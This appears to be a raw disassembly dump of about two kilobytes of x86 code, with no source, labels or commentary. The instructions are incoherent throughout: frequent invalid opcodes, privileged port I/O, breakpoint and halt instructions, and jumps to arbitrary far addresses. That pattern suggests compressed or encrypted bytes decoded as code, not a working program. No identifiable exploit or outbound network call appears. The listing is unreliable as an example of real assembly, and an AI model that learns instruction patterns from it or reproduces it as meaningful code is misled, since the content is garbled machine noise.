  4185db:	adc    BYTE PTR [ebp-0x3f],dl
  4185de:	xor    BYTE PTR [eax],cl
  4185e0:	xchg   ecx,eax
  4185e1:	test   BYTE PTR [esi+edx*8+0x30],bh
  4185e5:	call   0xe1b0de8
  4185ea:	aaa    
  4185eb:	mov    esi,0x762db68a
  4185f0:	jmp    0x38572b97
  4185f5:	popf   
  4185f6:	push   cs
  4185f7:	lahf   
  4185f8:	xor    bl,0x2c
  4185fb:	aaa    
  4185fc:	push   ss
  4185fd:	loopne 0x4185c5
  4185ff:	xchg   esi,eax
  418600:	mov    edx,DWORD PTR [ebx-0x57692b84]
  418606:	sti    
  418607:	(bad)  
  418608:	cmp    al,0x5c
  41860a:	loop   0x41863c
  41860c:	cli    
  41860d:	aaa    
  41860e:	imul   esp,DWORD PTR [ebx+0xa],0x6b
  418612:	lock adc al,0xd2
  418615:	stos   BYTE PTR es:[edi],al
  418616:	sub    ebp,DWORD PTR [ebp-0x12ffb2a5]
  41861c:	in     al,dx
  41861d:	in     al,dx
  41861e:	mov    bh,0x0
  418620:	(bad)
  418623:	jmp    0x418660
  418625:	sbb    DWORD PTR [edi+esi*1+0x1c223004],0xe776d091
  418630:	nop
  418631:	lahf   
  418632:	jg     0x418605
  418634:	pusha  
  418635:	jmp    0x41868d
  418637:	rol    BYTE PTR [ebx+0x61],0x52
  41863b:	test   DWORD PTR [ebx+0x7f],0xdd0c2f01
  418642:	jle    0x41866a
  418644:	(bad)  
  418645:	cmp    eax,0xc552cc14
  41864a:	xor    edi,DWORD PTR [eax-0x4a]
  41864d:	mov    dl,0x1e
  41864f:	sbb    DWORD PTR [ecx],edi
  418651:	jb     0x418630
  418653:	add    eax,0x2aab957d
  418658:	(bad)  
  418659:	adc    DWORD PTR [ecx+ecx*2-0x74],eax
  41865d:	xlat   BYTE PTR ds:[ebx]
  41865e:	out    0x2f,al
  418660:	sub    dl,bh
  418662:	rol    ebx,0xbf
  418665:	xchg   esp,eax
  418666:	jae    0x41866e
  418668:	mov    ah,0xf1
  41866a:	push   ecx
  41866b:	shl    DWORD PTR [ebx],0x83
  41866e:	cmp    al,0xb4
  418670:	inc    esp
  418671:	fistp  QWORD PTR [eax+0x56ec38f4]
  418677:	hlt    
  418678:	clc    
  418679:	into   
  41867a:	push   0x1aa323dc
  41867f:	popa   
  418680:	in     eax,0x85
  418682:	cdq    
  418683:	jbe    0x418628
  418685:	shr    DWORD PTR ds:0xdea6f15e,0x3c
  41868c:	inc    esp
  41868d:	imul   esp,DWORD PTR [edx+0xdf7daf9],0x4f
  418694:	stos   DWORD PTR es:[edi],eax
  418695:	push   ds
  418696:	mov    ?,WORD PTR [edx-0x21]
  418699:	inc    esp
  41869a:	js     0x418631
  41869c:	(bad)  
  41869d:	cs ds sub bl,ch
  4186a1:	pusha  
  4186a2:	scas   eax,DWORD PTR es:[edi]
  4186a3:	dec    ecx
  4186a4:	sbb    al,0xb2
  4186a6:	(bad)
  4186aa:	sahf   
  4186ab:	pop    edi
  4186ac:	sti    
  4186ad:	cmp    al,0x5f
  4186af:	std    
  4186b0:	popf   
  4186b1:	mov    BYTE PTR [ecx+0x26590927],dl
  4186b7:	into   
  4186b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186b9:	adc    bh,BYTE PTR [esi-0x5a4e2dce]
  4186bf:	shl    BYTE PTR [edi-0x36],0x29
  4186c3:	hlt    
  4186c4:	jle    0x4186f7
  4186c6:	fmul   st,st(3)
  4186c8:	adc    eax,0xbc99a576
  4186cd:	mov    ss,WORD PTR [esi]
  4186cf:	push   es
  4186d0:	dec    ecx
  4186d1:	mov    ebx,0x9268295c
  4186d6:	aas    
  4186d7:	fabs   
  4186d9:	cmp    eax,0xdc3bbd1c
  4186de:	or     BYTE PTR [edi-0x2],0xd4
  4186e2:	jbe    0x418709
  4186e4:	(bad)  
  4186e5:	retf   
  4186e6:	into   
  4186e7:	mov    dl,0xcc
  4186e9:	and    BYTE PTR [edx],al
  4186eb:	xchg   esp,eax
  4186ec:	imul   edi,ebx,0x10
  4186ef:	jae    0x418712
  4186f1:	sbb    BYTE PTR [eax+ebx*1],bh
  4186f4:	mov    bh,0xfe
  4186f6:	fldln2 
  4186f8:	sub    esp,eax
  4186fa:	bound  ecx,QWORD PTR [ecx-0x77d2ea50]
  418700:	or     al,0x91
  418702:	xor    BYTE PTR ds:0x18ed9f8f,cl
  418708:	xor    al,0xa9
  41870a:	shl    bh,1
  41870c:	sub    bl,dh
  41870e:	dec    esi
  41870f:	out    0xe,al
  418711:	mov    bl,BYTE PTR [edx+0x477089a1]
  418717:	sbb    al,0x46
  418719:	and    DWORD PTR [ebp+0x76],0xc050f61e
  418720:	(bad)  
  418721:	das    
  418722:	add    BYTE PTR [ecx],0x50
  418725:	inc    esp
  418726:	sub    dh,ch
  418728:	in     al,0x85
  41872a:	lea    eax,[ebx+0x5452b093]
  418730:	fidivr DWORD PTR [ebp+0xf4e15c]
  418736:	div    DWORD PTR [eax+0x4d175e51]
  41873c:	mov    ch,0x3b
  41873e:	mov    ch,0x56
  418740:	sti    
  418741:	push   ebp
  418742:	or     eax,0xd155e577
  418747:	or     al,0x23
  418749:	pop    esp
  41874a:	aas    
  41874b:	dec    edi
  41874c:	sbb    esi,eax
  41874e:	mov    DWORD PTR [ebp+0x47521b85],ebx
  418754:	dec    edx
  418755:	inc    edi
  418756:	jae    0x418718
  418758:	mov    bh,dh
  41875a:	and    eax,0x102ffb3a
  41875f:	fldcw  WORD PTR [ebx-0x646d433d]
  418765:	retf   0xa26
  418768:	pop    es
  418769:	jmp    0x17bc3a82
  41876e:	dec    esp
  41876f:	dec    esp
  418770:	mov    gs,WORD PTR [esi+0x4e6aa0e0]
  418776:	mov    WORD PTR [edi],cs
  418778:	ds push ds
  41877a:	ins    DWORD PTR es:[edi],dx
  41877b:	inc    edx
  41877c:	push   ecx
  41877d:	xor    BYTE PTR [edi],dh
  41877f:	xor    BYTE PTR ss:[ebx+0xe],bh
  418783:	in     eax,0xf5
  418785:	(bad)  
  418786:	fimul  WORD PTR [edx]
  418788:	adc    ah,bl
  41878a:	and    eax,0x764cac09
  41878f:	arpl   dx,cx
  418791:	add    eax,0xfa61710
  418796:	xor    DWORD PTR [ecx+0x591ed16c],ebx
  41879c:	sbb    al,BYTE PTR [ebx]
  41879e:	adc    DWORD PTR [eax-0x9],edi
  4187a1:	sahf   
  4187a2:	loop   0x4187e5
  4187a4:	dec    ebx
  4187a5:	pop    edx
  4187a6:	jge    0x418773
  4187a8:	dec    esi
  4187a9:	cmp    DWORD PTR [ebp-0x513131cc],edi
  4187af:	xchg   esi,eax
  4187b0:	sbb    DWORD PTR [eax],ebp
  4187b2:	mov    eax,0xb035480b
  4187b7:	shl    DWORD PTR [edi],1
  4187b9:	lea    edi,ds:0xcafacb1b
  4187bf:	push   0xffffffe0
  4187c1:	add    DWORD PTR [ebp-0x5ad95074],ebp
  4187c7:	ret    0x90c
  4187ca:	cmp    ch,BYTE PTR [eax+ebx*1]
  4187cd:	xor    DWORD PTR [ebp+0x3c],eax
  4187d0:	push   ecx
  4187d1:	loopne 0x41877c
  4187d3:	and    ecx,DWORD PTR [edi-0x18e2b887]
  4187d9:	xchg   ecx,eax
  4187da:	push   ebp
  4187db:	or     al,0xa7
  4187dd:	jg     0x5073a85d
  4187e3:	and    DWORD PTR [ecx-0x6e],edx
  4187e6:	cmp    BYTE PTR [ecx+0x40],ch
  4187e9:	inc    edx
  4187ea:	jge    0x4187ff
  4187ec:	shl    BYTE PTR [ebx-0x7f],cl
  4187ef:	xchg   esi,eax
  4187f0:	ja     0x4187f1
  4187f2:	xchg   DWORD PTR [ebp+0x25ef3a3c],ebp
  4187f8:	scas   al,BYTE PTR es:[edi]
  4187f9:	xchg   esi,eax
  4187fa:	jns    0x418861
  4187fc:	shr    DWORD PTR [ecx+0x6fb3d03d],cl
  418802:	mov    BYTE PTR [edi-0x55162ef9],cl
  418808:	into   
  418809:	cs xchg ecx,eax
  41880b:	(bad)  
  41880c:	inc    ecx
  41880d:	or     eax,0x14a868c0
  418812:	out    dx,eax
  418813:	fwait
  418814:	fwait
  418815:	push   edi
  418816:	mov    dl,0xeb
  418818:	push   0x2db0bab9
  41881d:	ficom  DWORD PTR [edi]
  41881f:	(bad)  
  418820:	lods   al,BYTE PTR ds:[esi]
  418821:	imul   edx,DWORD PTR [edi-0x20],0x3ab9c3f6
  418828:	and    dl,BYTE PTR [eax+esi*4-0x3e14d8e3]
  41882f:	sbb    eax,0xbf50f3ba
  418834:	scas   eax,DWORD PTR es:[edi]
  418835:	out    dx,eax
  418836:	test   DWORD PTR [eax],ebx
  418838:	mov    ds:0xe16af3be,al
  41883d:	bound  edx,QWORD PTR [edx-0xfba149b]
  418843:	mov    ebx,0x7bba92f6
  418848:	outs   dx,DWORD PTR ds:[esi]
  418849:	cs mov bh,0x3f
  41884c:	push   edx
  41884d:	aam    0xd0
  41884f:	adc    DWORD PTR [ecx],ebp
  418851:	enter  0xc9ef,0x24
  418855:	or     ch,0x80
  418858:	mov    ds:0xa2abdbdc,al
  41885d:	jl     0x4188b7
  41885f:	and    DWORD PTR [edx+0x7af813a5],ebx
  418865:	inc    ebx
  418866:	sub    al,0x2e
  418868:	(bad)  
  418869:	xchg   ebx,eax
  41886a:	outs   dx,BYTE PTR ds:[esi]
  41886b:	mov    esp,0x579b0e7b
  418870:	add    al,0x9d
  418872:	sub    esp,DWORD PTR [edx]
  418874:	dec    eax
  418875:	cld    
  418876:	push   ds
  418877:	adc    eax,DWORD PTR [edi-0xc]
  41887a:	push   edx
  41887b:	enter  0xff82,0x45
  41887f:	icebp  
  418880:	push   ecx
  418881:	add    ah,BYTE PTR [ebp-0x607cdb64]
  418887:	push   ds
  418888:	outs   dx,BYTE PTR ds:[esi]
  418889:	pop    ebx
  41888a:	popf   
  41888b:	ror    DWORD PTR [edi+esi*1+0x1a],1
  41888f:	repnz aad 0xda
  418892:	cmp    BYTE PTR [ebx+0x6],bh
  418895:	out    0xae,al
  418897:	and    eax,0x490361a4
  41889c:	jb     0x4188ba
  41889e:	dec    esi
  41889f:	aaa    
  4188a0:	sub    BYTE PTR ds:0xd2d59a71,ch
  4188a6:	daa    
  4188a7:	pop    edi
  4188a8:	xchg   BYTE PTR [ecx-0x7dc581eb],al
  4188ae:	dec    edx
  4188af:	cs add bh,al
  4188b2:	lahf   
  4188b3:	fdivr  DWORD PTR [edi-0x12e15863]
  4188b9:	pop    esp
  4188ba:	test   DWORD PTR fs:[ecx],0x19e200fc
  4188c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188c2:	dec    ebx
  4188c3:	dec    eax
  4188c4:	mov    bh,0x8
  4188c6:	sub    al,0xd6
  4188c9:	lods   eax,DWORD PTR ds:[esi]
  4188ca:	sub    ah,BYTE PTR [ecx-0x7f]
  4188cd:	mov    dl,0x63
  4188cf:	push   edx
  4188d0:	cmc    
  4188d1:	out    0x2,al
  4188d3:	jge    0x4188f7
  4188d5:	(bad)  
  4188d6:	int3   
  4188d7:	jne    0x4188e5
  4188d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188da:	sub    esp,DWORD PTR [esi+0x5391ea8]
  4188e0:	fild   WORD PTR [esi-0x6bb3713b]
  4188e6:	sub    al,0xf8
  4188e8:	cmp    al,0x99
  4188ea:	ret    
  4188eb:	lods   eax,DWORD PTR ds:[esi]
  4188ec:	pop    eax
  4188ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188ee:	or     edx,DWORD PTR [edx]
  4188f0:	mov    eax,ds:0x5b8b0131
  4188f5:	push   edi
  4188f6:	add    al,0xee
  4188f8:	out    dx,eax
  4188f9:	mov    ch,0x63
  4188fb:	adc    al,0x40
  4188fd:	cmp    BYTE PTR [edx+edx*8],ch
  418900:	cmp    DWORD PTR [ebx-0x1e],ebx
  418903:	ror    ebp,0x36
  418906:	ret    
  418907:	and    al,0x8f
  418909:	mov    edi,0xaa8ba1a2
  41890e:	test   BYTE PTR [edi],0xa
  418911:	icebp  
  418912:	mov    edi,0x546466c7
  418917:	mov    edx,0x89bd94ef
  41891c:	jle    0x4188cb
  41891e:	and    DWORD PTR [ebp+eiz*4+0x10049fb0],esi
  418925:	and    esi,DWORD PTR [esp+edi*8-0x77a47766]
  41892c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41892d:	lods   eax,DWORD PTR ds:[esi]
  41892e:	xor    eax,edx
  418930:	das    
  418931:	sti    
  418932:	test   BYTE PTR [ebp-0x39bafbe1],dl
  418938:	add    al,0x11
  41893a:	add    bh,BYTE PTR [ecx+0x4f4a9e37]
  418940:	enter  0x8255,0x86
  418944:	push   esi
  418945:	dec    ebx
  418946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418947:	nop
  418948:	add    BYTE PTR [edi+eax*2],0x70
  41894c:	dec    ebp
  41894d:	and    edi,DWORD PTR [esi+0x4c187a11]
  418953:	test   edx,edi
  418955:	mov    ebp,ebx
  418957:	aas    
  418958:	jmp    0x418997
  41895a:	xor    eax,DWORD PTR [ebx-0x1e8c73c6]
  418960:	fsub   QWORD PTR [esi-0x6b3e9dfc]
  418966:	dec    ebx
  418967:	adc    ebp,DWORD PTR [edi+0x59]
  41896a:	mov    ds:0x256c91a8,eax
  41896f:	xchg   esi,eax
  418970:	sbb    BYTE PTR [eax-0x8],ah
  418973:	mov    dl,0xa8
  418975:	dec    esi
  418976:	scas   eax,DWORD PTR es:[edi]
  418977:	in     al,dx
  418978:	pop    esp
  418979:	dec    ebp
  41897a:	mov    esp,0x2fac9721
  41897f:	jne    0x4189ab
  418981:	scas   eax,DWORD PTR es:[edi]
  418982:	jo     0x41895d
  418984:	inc    edi
  418985:	int3   
  418986:	hlt    
  418987:	jecxz  0x4189d6
  418989:	add    BYTE PTR [ebx],bh
  41898b:	add    eax,0xa6ab8a2f
  418990:	xor    ebp,DWORD PTR [ebp+0x38]
  418993:	cmovnp ecx,DWORD PTR [ebp+0x175bc8d3]
  41899a:	inc    edi
  41899b:	cmp    al,0x55
  41899d:	push   ebp
  41899e:	out    0x5,eax
  4189a0:	popa   
  4189a1:	dec    esi
  4189a2:	in     al,0x52
  4189a4:	fs std 
  4189a6:	mov    edi,0xaa7480b5
  4189ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189ac:	mov    esi,0xebf5f808
  4189b1:	xchg   esi,eax
  4189b2:	pop    es
  4189b3:	outs   dx,BYTE PTR ds:[esi]
  4189b4:	loop   0x4189ad
  4189b6:	arpl   WORD PTR [esi-0x44],ax
  4189b9:	iret   
  4189ba:	fcmovnbe st,st(1)
  4189bc:	cmp    DWORD PTR ds:0x1a6ade50,esp
  4189c2:	and    BYTE PTR [edx-0x7bdeed91],0x29
  4189c9:	inc    edx
  4189ca:	repz aas 
  4189cc:	js     0x4189a5
  4189ce:	and    BYTE PTR [ebx],ch
  4189d0:	mov    ebx,0xfe90a2da
  4189d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189d6:	test   BYTE PTR [edx-0x2834a585],0x3c
  4189dd:	mov    al,ds:0xb2172151
  4189e2:	or     DWORD PTR [ebx+0xb],ecx
  4189e5:	add    edi,0x43
  4189e8:	push   0xffffffb9
  4189ea:	scas   al,BYTE PTR es:[edi]
  4189eb:	imul   esi,DWORD PTR [eax+0x6f433591],0x773a511b
  4189f5:	ret    
  4189f6:	sub    bh,al
  4189f8:	mov    eax,DWORD PTR [ecx-0x4a]
  4189fb:	push   edx
  4189fc:	cld    
  4189fd:	sar    BYTE PTR [ebp-0x4b],0x4b
  418a01:	in     al,dx
  418a02:	xor    ebp,DWORD PTR [ebx]
  418a04:	inc    esp
  418a05:	mov    bh,0xfd
  418a07:	fwait
  418a08:	adc    DWORD PTR [di],ecx
  418a0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a0c:	(bad)  
  418a0d:	jnp    0x418a5c
  418a0f:	add    eax,0x7860bb82
  418a14:	xor    DWORD PTR [edi+0x1e],0xee251ba
  418a1b:	dec    esp
  418a1c:	pop    ecx
  418a1d:	addr16 aam 0xf2
  418a20:	(bad)  
  418a21:	fisub  WORD PTR [eax-0x7c8f1f8b]
  418a27:	push   es
  418a28:	jmp    0xd5a331b2
  418a2d:	bound  ebp,QWORD PTR [edi-0x41]
  418a30:	neg    DWORD PTR [ecx]
  418a32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a33:	mov    edi,0xb3513f02
  418a38:	out    0x85,al
  418a3a:	xor    eax,0x97491f81
  418a3f:	daa    
  418a40:	icebp  
  418a41:	call   esp
  418a43:	neg    DWORD PTR [ecx]
  418a45:	imul   esp,DWORD PTR [esi-0x35],0xffffffcf
  418a49:	ja     0x418a9f
  418a4b:	inc    esp
  418a4c:	jae    0x418a39
  418a4e:	mov    ebx,0xb1362b01
  418a53:	push   ecx
  418a54:	pop    eax
  418a55:	fisubr WORD PTR [eax+0x50]
  418a58:	xchg   esp,eax
  418a59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a5b:	cli    
  418a5c:	adc    edx,DWORD PTR [ebp-0x66]
  418a5f:	call   0xd86016c
  418a64:	cmp    ch,BYTE PTR [edi+0x2a]
  418a67:	adc    ebx,ebx
  418a69:	(bad)  
  418a6b:	lock in al,0x7f
  418a6e:	push   es
  418a6f:	push   ss
  418a70:	xchg   edi,eax
  418a71:	jnp    0x418a95
  418a73:	inc    edx
  418a74:	test   eax,0xf260ca4d
  418a79:	mov    ds:0x37ecbbde,al
  418a7e:	popw   ss
  418a80:	xor    al,0xb7
  418a82:	and    BYTE PTR [ebp-0x4d],0x72
  418a86:	ss je  0x418a5a
  418a89:	sbb    bl,al
  418a8b:	and    al,0xc4
  418a8d:	inc    ebx
  418a8e:	das    
  418a8f:	int    0x31
  418a91:	fstp   QWORD PTR [ecx]
  418a93:	addr16 mov bl,0x36
  418a96:	or     eax,0xc93387b2
  418a9b:	xor    DWORD PTR [ecx+0x13f3ef6],ebx
  418aa1:	xchg   ecx,eax
  418aa2:	add    ah,BYTE PTR [esi+ecx*1-0x26]
  418aa6:	push   ecx
  418aa7:	sub    BYTE PTR [eax+0x596bfcf],0xc3
  418aae:	sbb    esp,DWORD PTR ss:[eax-0x26f73785]
  418ab5:	(bad)  
  418ab6:	in     al,0x24
  418ab8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ab9:	jle    0x418ae1
  418abb:	lahf   
  418abc:	mov    ?,WORD PTR [ebx-0x6089f8e9]
  418ac2:	and    eax,0xb920f5f3
  418ac7:	dec    ebp
  418ac8:	imul   edi,DWORD PTR [ebp+0x62],0xffffff91
  418acc:	pop    ss
  418acd:	imul   esp,DWORD PTR [edi-0x7b],0x8050b145
  418ad4:	ficomp WORD PTR [eax]
  418ad6:	ins    BYTE PTR es:[edi],dx
  418ad7:	mul    BYTE PTR [edx]
  418ad9:	pop    ds
  418ada:	fcmovne st,st(7)
  418adc:	fcom   QWORD PTR [ebx]
  418ade:	sti    
  418adf:	(bad)  
  418ae0:	mov    ds:0xe34bd1de,eax
  418ae5:	inc    esp
  418ae6:	fiadd  DWORD PTR [eax]
  418ae8:	cwde   
  418ae9:	shr    BYTE PTR [ebx+0x17],0xb
  418aed:	or     al,0x22
  418aef:	out    dx,al
  418af0:	and    BYTE PTR [ecx-0x6e],al
  418af3:	jbe    0x418a96
  418af5:	clc    
  418af6:	sar    BYTE PTR [esi+edi*4],1
  418af9:	in     eax,dx
  418afa:	idiv   BYTE PTR [edx-0x66a407bc]
  418b00:	sub    DWORD PTR [esi+eax*8-0x769ea5ff],ecx
  418b07:	test   BYTE PTR [edi+edx*4-0x46],dh
  418b0b:	shl    ch,0xa6
  418b0e:	pusha  
  418b0f:	(bad)  [edx]
  418b11:	mov    dh,0x28
  418b13:	push   ds
  418b14:	ret    
  418b15:	shl    BYTE PTR [ebx],cl
  418b17:	enter  0x191,0x3
  418b1b:	cmp    DWORD PTR [edi+0x42],edi
  418b1e:	daa    
  418b1f:	mov    ds:0xa3816364,al
  418b24:	fdivr  st(2),st
  418b26:	sbb    eax,0x5a030f07
  418b2b:	adc    DWORD PTR [eax],edi
  418b2d:	dec    esp
  418b2e:	adc    bl,BYTE PTR [ebp-0x8953c1b]
  418b34:	lock sbb BYTE PTR [eax],bh
  418b37:	cmp    ebx,DWORD PTR [edx-0x3a]
  418b3a:	mov    fs,ebx
  418b3c:	out    0x12,eax
  418b3e:	mov    ebp,0x6a11d511
  418b43:	scas   eax,DWORD PTR es:[edi]
  418b44:	mov    al,0x46
  418b46:	jae    0x418b55
  418b48:	push   ebx
  418b49:	ficom  WORD PTR [ebp-0x7f]
  418b4c:	and    eax,0x37892c86
  418b51:	call   0x948:0xa7cc6d52
  418b58:	jle    0x418b7c
  418b5a:	retf   0x9299
  418b5d:	mov    ebp,0x6fc975aa
  418b62:	pop    es
  418b63:	cmp    cl,dl
  418b65:	pushf  
  418b66:	or     BYTE PTR ds:0x62377038,dl
  418b6c:	sbb    BYTE PTR [ebp-0x3cd3ce76],0xdd
  418b73:	pop    esi
  418b74:	push   ebp
  418b75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b76:	fisubr DWORD PTR [edx+0x2acf3249]
  418b7c:	les    ecx,FWORD PTR [ebx]
  418b7e:	imul   esp,DWORD PTR fs:[edx+0x38],0x12298e07
  418b86:	les    edi,FWORD PTR [ebp+0x59]
  418b89:	add    DWORD PTR [edx],0xffffff8e
  418b8c:	xchg   edi,eax
  418b8d:	jg     0x418b2d
  418b8f:	or     al,0x26
  418b91:	sbb    DWORD PTR [ebx],eax
  418b93:	xchg   edi,eax
  418b94:	loop   0x418bcf
  418b96:	inc    ebx
  418b97:	or     eax,0xa374d8f7
  418b9c:	cmp    BYTE PTR [edi],0xe9
  418b9f:	scas   eax,DWORD PTR es:[edi]
  418ba0:	je     0x418ba4
  418ba2:	xor    DWORD PTR [ebx+ecx*2+0x793a7925],0x1bafefb7
  418bad:	mov    esp,0x7893cebe
  418bb2:	ja     0x418b94
  418bb4:	jnp    0x418b7f
  418bb6:	pop    ebp
  418bb7:	mov    cl,0xb
  418bb9:	mov    cl,0xcd
  418bbb:	lea    ecx,[esi+ebp*8]
  418bbe:	xlat   BYTE PTR ds:[ebx]
  418bbf:	loop   0x418bcb
  418bc1:	in     eax,dx
  418bc2:	cs jl  0x418bc9
  418bc5:	call   0xafde285b
  418bca:	aad    0x97
  418bcc:	pop    edi
  418bcd:	bound  ebx,QWORD PTR [edi+0x64cbb67b]
  418bd3:	aam    0xb8
  418bd5:	inc    esi
  418bd6:	inc    eax
  418bd7:	mov    eax,DWORD PTR [eax+0x19]
  418bda:	push   ecx
  418bdb:	add    BYTE PTR [ecx-0x5d],cl
  418bde:	test   BYTE PTR [ecx+0x4e],ch
  418be1:	sbb    al,0xaa
  418be3:	mov    BYTE PTR [eax+0x42],ah
  418be6:	jmp    FWORD PTR [edi]
  418be8:	gs jno 0x418b82
  418beb:	cmp    eax,0xb195f4db
  418bf0:	adc    ah,BYTE PTR [ecx+0x5fa2032]
  418bf6:	inc    BYTE PTR [esi]
  418bf8:	call   0x99d58354
  418bfd:	and    eax,0x80ae69e5
  418c02:	dec    ecx
  418c03:	jge    0x418bc3
  418c05:	rcl    BYTE PTR [ebx],cl
  418c07:	mov    ds:0x56baf7a7,al
  418c0c:	not    DWORD PTR [ebp-0x2e3a03c6]
  418c12:	enter  0x745d,0x91
  418c16:	(bad)  
  418c17:	in     al,0x3a
  418c19:	sub    ebp,DWORD PTR [edi+0x54]
  418c1c:	sti    
  418c1d:	jbe    0x418c4b
  418c1f:	pop    ss
  418c20:	sti    
  418c21:	in     al,dx
  418c22:	or     ch,dl
  418c24:	mov    ebx,0x2daa851c
  418c29:	cmp    al,0xca
  418c2b:	in     al,dx
  418c2c:	sar    BYTE PTR [ecx-0x20],cl
  418c2f:	in     eax,dx
  418c30:	js     0x418bcc
  418c32:	js     0x418c94
  418c34:	sbb    ebp,edi
  418c36:	fstp   QWORD PTR [esi+0x3f6692c7]
  418c3c:	aad    0xe8
  418c3e:	popf   
  418c3f:	mov    edx,0xa7668194
  418c44:	xchg   esi,eax
  418c45:	fld    DWORD PTR [ecx+0x5e]
  418c48:	push   edx
  418c49:	xor    dl,dh
  418c4b:	push   es
  418c4c:	fdivr  st(0),st
  418c4e:	out    0xbb,al
  418c50:	or     BYTE PTR [ecx+ecx*1],al
  418c53:	ins    BYTE PTR es:[edi],dx
  418c54:	lea    eax,ss:[ebx+ebx*1-0x43]
  418c59:	jbe    0x418c96
  418c5b:	fiadd  DWORD PTR [ebx+0x5f]
  418c5e:	push   esp
  418c5f:	pop    es
  418c60:	sti    
  418c61:	push   ds
  418c62:	mov    esp,0x24df9214
  418c67:	add    DWORD PTR [edi+eiz*4+0x23],0x460ea713
  418c6f:	add    esp,eax
  418c71:	inc    eax
  418c72:	jno    0x418cb5
  418c74:	push   ds
  418c75:	xor    BYTE PTR [ecx],0xdf
  418c78:	push   ds
  418c79:	not    ebx
  418c7b:	push   es
  418c7c:	sar    edx,0xb
  418c7f:	sbb    dl,BYTE PTR [esi+0x34f9633c]
  418c85:	lods   al,BYTE PTR ds:[esi]
  418c86:	xchg   esp,eax
  418c87:	aam    0x0
  418c89:	cmp    dl,BYTE PTR [ebp+eiz*4+0x36]
  418c8d:	xchg   edi,eax
  418c8e:	fmul   DWORD PTR ds:0x6b1caeb3
  418c94:	cmp    dh,0x10
  418c97:	jo     0x418c88
  418c99:	cmp    cl,BYTE PTR [ebp-0x2dced178]
  418c9f:	js     0x418c5d
  418ca1:	loopne 0x418cb9
  418ca3:	cmp    dh,BYTE PTR [edx+0x6009ea6a]
  418ca9:	cmp    DWORD PTR [eax-0x44],ecx
  418cac:	dec    ebp
  418cad:	cmp    eax,0xb39818d7
  418cb2:	and    ecx,DWORD PTR [ebp+0x54]
  418cb5:	push   edi
  418cb6:	icebp  
  418cb7:	mov    bh,0xd7
  418cb9:	jmp    0x3f9bacc1
  418cbe:	mov    ebx,0x4a9bd116
  418cc3:	pop    esp
  418cc4:	or     al,cl
  418cc6:	cdq    
  418cc7:	in     al,dx
  418cc8:	js     0x418c96
  418cca:	gs mov bl,al
  418ccd:	mov    dl,0xa3
  418ccf:	out    dx,al
  418cd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cd1:	std    
  418cd2:	mov    fs,WORD PTR [edx]
  418cd4:	jle    0x418ca6
  418cd6:	xchg   ecx,eax
  418cd7:	retf   
  418cd8:	mov    ah,0x67
  418cda:	inc    ecx
  418cdb:	xor    eax,0xb19b93e1
  418ce0:	mov    esp,0xa47b70e1
  418ce5:	fistp  QWORD PTR [eax]
  418ce7:	ja     0x418cfa
  418ce9:	push   ss
  418cea:	call   DWORD PTR [edi-0x5d3ae4e1]
  418cf0:	or     eax,0x995d11e3
  418cf5:	sub    edx,edx
  418cf7:	add    al,0xde
  418cf9:	ss dec ecx
  418cfb:	cwde   
  418cfc:	jmp    0x418d4d
  418cfe:	fidiv  WORD PTR [edx]
  418d00:	or     BYTE PTR [esp+ecx*4],bh
  418d03:	aam    0x1
  418d05:	iret   
  418d06:	xor    edi,DWORD PTR [ecx]
  418d08:	sbb    eax,0x11253a41
  418d0d:	lock retf 
  418d0f:	mov    eax,0xd7e49502
  418d14:	loope  0x418d18
  418d16:	xchg   ebp,eax
  418d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d18:	dec    eax
  418d19:	call   0xec9f3cdb
  418d1e:	push   0x9e98c895
  418d23:	jp     0x418cfe
  418d25:	pop    eax
  418d26:	addr16 cwde 
  418d28:	jg     0x418d1f
  418d2a:	ds lahf 
  418d2c:	mov    bh,0x8f
  418d2e:	xchg   ecx,eax
  418d2f:	loop   0x418da5
  418d31:	add    al,0x7a
  418d33:	icebp  
  418d34:	push   esp
  418d35:	lds    esp,FWORD PTR [ecx]
  418d37:	cmp    DWORD PTR [edx-0x6b6662c1],ebx
  418d3d:	test   esp,edi
  418d3f:	ret    
  418d40:	repnz hlt 
  418d42:	(bad)  
  418d43:	out    dx,eax
  418d44:	jo     0x418d79
  418d46:	add    BYTE PTR [edx-0x41],al
  418d49:	aaa    
  418d4a:	push   ss
  418d4b:	pop    es
  418d4c:	push   0x166ff605
  418d51:	mov    al,0xf9
  418d53:	pop    edx
  418d54:	cmp    bh,BYTE PTR [esi]
  418d56:	mov    bh,0x69
  418d58:	sub    DWORD PTR [edx],edx
  418d5a:	sbb    DWORD PTR [esi],esi
  418d5c:	pop    ss
  418d5d:	not    DWORD PTR [esi]
  418d5f:	repnz dec ecx
  418d61:	dec    eax
  418d62:	lea    ecx,[ebx-0x1c02d603]
  418d68:	imul   esp,DWORD PTR [edi],0xc63fa5f7
  418d6e:	imul   esp,DWORD PTR [ebp+eax*4+0x48f34d1b],0x40
  418d76:	mov    ebx,0x13c1ef21
  418d7b:	call   0xd402a6c4
  418d80:	dec    edi
  418d81:	loope  0x418d8d
  418d83:	imul   ebx,DWORD PTR [edx-0x2a317fc7],0xffffff8d
  418d8a:	bound  edx,QWORD PTR [eax+ebx*1-0xce2b4f5]
  418d91:	and    eax,0x9e6695ec
  418d96:	dec    edi
  418d98:	add    eax,0x97c2a430
  418d9d:	inc    ecx
  418d9e:	ss inc ecx
  418da0:	imul   ebp,DWORD PTR [esi+edx*2-0x4f],0xc8dee1ed
  418da8:	cwde   
  418da9:	dec    edi
  418daa:	in     eax,dx
  418dab:	(bad)  
  418dac:	(bad)  
